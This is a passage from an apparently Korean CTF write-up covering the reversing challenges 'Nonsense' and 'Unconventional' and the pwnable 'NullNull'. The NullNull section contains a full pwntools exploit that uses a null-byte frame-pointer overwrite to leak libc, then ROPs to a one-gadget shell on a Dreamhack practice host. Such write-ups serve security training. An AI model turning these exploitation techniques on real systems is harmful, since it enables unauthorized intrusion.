<span class="n">r</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">g</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">][::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="ow">or</span> <span class="s">"big-endian -&gt; little-endian"</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">g</span><span class="p">),</span> <span class="mi">8</span><span class="p">)]</span>
<span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">r</span><span class="p">)[:</span><span class="mi">16</span><span class="p">])</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'x'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
</pre></table></code></div></div><h2 id="d-nonsense---reversing">D. Nonsense - Reversing<a href="#d-nonsense---reversing" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>크지 않은 바이너리를 가진 리버싱 문제였다.</p><p>대충 요약하면, argv[1]으로 길이가 48인 인풋을 받고 2바이트씩 쪼개서 알 수 없는 연산을 한 후에 테이블의 값과 비교를 하는 바이너리이다.</p><p>하지만 그 알 수 없는 연산은 대충 봤을 때, 지옥 불구덩이의 용암 같은 열정도 당장 베스킨라빈스 아이스크림이 되도록 생겨 먹어서 분석하고 싶지 않았따.</p><p>이 떄문에, 해당 연산을 수행하는 함수에 2 byte씩 대입하는 코드를 작성하여 플래그를 얻기로 하였고<br /> 앵거를 사용하면 좋았겠지만, 쓸 줄 몰라서 gdb script를 통해 스크립트를 작성하였다.</p><blockquote><p>Solution Script</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre><span class="c1">#!gdb nonsense -x
</span><span class="kn">import</span> <span class="nn">gdb</span>

<span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x20</span>
<span class="n">r</span> <span class="o">=</span> <span class="p">[[]</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">)]</span>

<span class="k">class</span> <span class="nc">bpa</span><span class="p">(</span><span class="n">gdb</span><span class="p">.</span><span class="n">Breakpoint</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">stop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">global</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span>
        <span class="c1"># print(a,b)
</span>        <span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s">"set $rdi=</span><span class="si">{</span><span class="p">(</span><span class="n">a</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">b</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">False</span>

<span class="n">t</span><span class="o">=</span> <span class="p">[</span><span class="mh">0x00000000AB1FF171</span><span class="p">,</span> <span class="mh">0x00000000116437CE</span><span class="p">,</span> <span class="mh">0x00000000E6049FC0</span><span class="p">,</span> <span class="mh">0x00000000452929D1</span><span class="p">,</span> <span class="mh">0x0000000075A447EB</span><span class="p">,</span> <span class="mh">0x00000000C9E8CDA8</span><span class="p">,</span> <span class="mh">0x000000001CDB0144</span><span class="p">,</span> <span class="mh">0x00000000F6D4EA9C</span><span class="p">,</span> <span class="mh">0x000000001CDB0144</span><span class="p">,</span> <span class="mh">0x00000000C64319B3</span><span class="p">,</span> <span class="mh">0x00000000F2D03C54</span><span class="p">,</span> <span class="mh">0x00000000CABE6234</span><span class="p">,</span> <span class="mh">0x000000001195A6AB</span><span class="p">,</span> <span class="mh">0x00000000DC8A5604</span><span class="p">,</span> <span class="mh">0x00000000A7DC071B</span><span class="p">,</span> <span class="mh">0x000000003ED216D4</span><span class="p">,</span> <span class="mh">0x00000000D05424C0</span><span class="p">,</span> <span class="mh">0x000000001A13D5D9</span><span class="p">,</span> <span class="mh">0x00000000E8A2E464</span><span class="p">,</span> <span class="mh">0x000000008469B42D</span><span class="p">,</span> <span class="mh">0x00000000F6D4EA9C</span><span class="p">,</span> <span class="mh">0x00000000452929D1</span><span class="p">,</span> <span class="mh">0x00000000BAEBBCB0</span><span class="p">,</span> <span class="mh">0x00000000EBB57056</span><span class="p">]</span>
<span class="n">r</span><span class="o">=</span> <span class="p">[</span><span class="bp">None</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="p">(</span><span class="n">t</span><span class="p">)]</span>

<span class="k">class</span> <span class="nc">bpb</span><span class="p">(</span><span class="n">gdb</span><span class="p">.</span><span class="n">Breakpoint</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">stop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">global</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">r</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="n">x</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"p $rax"</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">())</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
            <span class="k">if</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">t</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
                <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
                <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
                    <span class="k">try</span><span class="p">:</span><span class="n">r</span><span class="p">[(</span><span class="n">i</span> <span class="p">:</span><span class="o">=</span> <span class="n">t</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
                    <span class="k">except</span><span class="p">:</span><span class="k">break</span>
                    
        <span class="k">except</span> <span class="n">gdb</span><span class="p">.</span><span class="nb">MemoryError</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">b</span> <span class="p">:</span><span class="o">=</span> <span class="n">b</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x7f</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="p">:</span><span class="o">=</span> <span class="n">a</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x7f</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
                <span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"q"</span><span class="p">)</span>
            <span class="n">b</span> <span class="o">=</span> <span class="mh">0x20</span>

        <span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"set $rip=0x555555400B78"</span><span class="p">)</span>

        <span class="k">return</span> <span class="bp">False</span>

<span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"file nonsense"</span><span class="p">)</span>

<span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"aslr off"</span><span class="p">)</span>

<span class="n">bpa</span><span class="p">(</span><span class="s">"* 0x555555400B7A"</span><span class="p">)</span>
<span class="n">bpb</span><span class="p">(</span><span class="s">"* 0x555555400b7f"</span><span class="p">)</span>

<span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"r asdfasdfasdfsadfasdfasdfasdfsadfasdfasdfasdfsadf"</span><span class="p">)</span>
</pre></table></code></div></div><h2 id="e-nullnull---pwnable">E. NullNull - Pwnable<a href="#e-nullnull---pwnable" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>바이너리를 분석해보면 아래와 같은 함수가 있다.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">sub_13BD</span><span class="p">(){</span>
  <span class="n">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp-50h] [rbp-50h]</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%80s"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>안전하게 입력 받은 문자열을 그대로 출력해주는 것 같지만, <code class="language-plaintext highlighter-rouge">scanf</code>의 <code class="language-plaintext highlighter-rouge">%s</code>로 입력을 받기 때문에<br /> <code class="language-plaintext highlighter-rouge">v1[입력받은 문자열의 길이]</code>에 0이 들어가게 되어서 <code class="language-plaintext highlighter-rouge">sfp</code>의 최하위 바이트를 0으로 덮을 수가 있다.<br /> 때문에, rbp의 값이 비정상적으로 변하게 되고, 함수의 리턴이 연속으로 2회 일어나게 되면 rip가 의도되지 않은 곳으로 이동한다.</p><p>또한, <code class="language-plaintext highlighter-rouge">sub_13BD</code>의 상위 함수의 변수들은 rbp를 기반으로 참조되기 때문에<br /> 스택의 8bytes read write 인덱스를 제한하는 기존의 32라는 값이 저장된 스택의 주소가 아니라<br /> 변조된 rbp를 통해 다른 주소의 값을 참조하게 하면서 스택의 read write 과정에서 oob가 발생하게 된다.</p><p>따라서 올바르게 작동하는 경우의 수 하나를 이용하여 ROP를 하는 익스플로잇을 짜고<br /> 아다리가 맞을 때까지 연결하면 쉘을 얻을 수 있다.</p><blockquote><p>Exploit Script</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./nullnull_patched'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">libc</span>

<span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'read(</span><span class="si">{</span><span class="n">idx</span><span class="o">=</span><span class="si">}</span><span class="s">)'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'write(</span><span class="si">{</span><span class="n">idx</span><span class="o">=</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">val</span><span class="o">=</span><span class="si">}</span><span class="s">)'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">val</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">echo</span><span class="p">(</span><span class="n">val</span><span class="p">):</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'echo(</span><span class="si">{</span><span class="n">val</span><span class="o">=</span><span class="si">}</span><span class="s">)'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">re</span><span class="p">():</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'re()'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'0'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">out</span><span class="p">():</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'out()'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'-1'</span><span class="p">)</span>

<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
    <span class="c1"># p = e.process()
</span>    <span class="n">p</span><span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'host1.dreamhack.games'</span><span class="p">,</span> <span class="mi">14359</span><span class="p">)</span>

    <span class="n">echo</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="o">*</span><span class="mi">80</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>

    <span class="n">read</span><span class="p">(</span><span class="mi">37</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span><span class="n">base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&gt;q"</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">())).</span><span class="nb">hex</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">continue</span>
    <span class="k">if</span> <span class="n">base</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">continue</span>
    <span class="n">base</span> <span class="o">-=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0xf3</span>
    <span class="k">if</span> <span class="n">base</span><span class="o">&amp;</span><span class="mh">0xFF</span><span class="o">!=</span><span class="mi">0</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">continue</span>

    <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">))</span>
    <span class="n">rdx_r12</span> <span class="o">=</span> <span class="mh">0x0000000000119241</span> <span class="o">+</span> <span class="n">base</span>
    <span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x000000000002604f</span> <span class="o">+</span> <span class="n">base</span>
    <span class="n">oneshot</span> <span class="o">=</span> <span class="mh">0xe3d29</span> <span class="o">+</span> <span class="n">base</span>

    <span class="n">write</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">rdx_r12</span><span class="p">)</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">rsi</span><span class="p">)</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">oneshot</span><span class="p">)</span>

    <span class="n">re</span><span class="p">()</span>

    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="k">break</span>
</pre></table></code></div></div><h2 id="f-unconventional---reversing">F. Unconventional - Reversing<a href="#f-unconventional---reversing" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>rax와 rsp의 역할이 바뀐 평행세계의 바이너리를 컨셉으로 한 문제이다.</p><p>rax를 통해 push, pop하는 과정과 함수를 호출하는 과정이 얼핏 생각하면 당연하지만 참신하고 재미있게 느껴졌다.</p><p>일단 바이너리를 분석해보면 크기가 크지 않기 때문에<br /> 어렵지 않게 어떠한 루틴을 갖고 동작하는지 알 수 있었다.</p><p>fgets를 통해 길이가 48인 입력을 받고, 입력을 길이가 16인 블록으로 쪼개서 연산한다.</p><p>연산은 x라고 임의로 정의한 <code class="language-plaintext highlighter-rouge">[0x21, 0xE5, 0x88, 0xAC, 0xBB, 0xB0, 0x97, 0xEA, 0x16, 0x42, 0x03, 0x0B, 0x9B, 0xD2, 0x5C, 0x6C]</code> 값과 함께 진행된다.</p><p>각 블록별로 0xC0FF33번 연산을 반복하는데, 연산의 과정은 아래와 같았다.</p><ol><li>블럭을 ARIA의 2번째 sbox로 <code class="language-plaintext highlighter-rouge">substitute</code><li>블럭을 AES 방식으로 <code class="language-plaintext highlighter-rouge">shift row</code><li><code class="language-plaintext highlighter-rouge">[0x03, 0x0C, 0x0B, 0x05, 0x08, 0x04, 0x07, 0x0D, 0x0F, 0x00, 0x06, 0x0E, 0x09, 0x01, 0x0A, 0x02]</code>을 이용하여 블럭에다가 xor, add, rol<li>x와 블록을 xor<li>x에다가 1 ~ 3 연산</ol><p>이를 대충 파이썬 스크립트로 변환하면 아래와 같았다.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">tqdm</span> <span class="c1"># progress bar
</span><span class="n">x</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">]</span>
<span class="n">comp</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">]</span>
<span class="n">sbox</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> 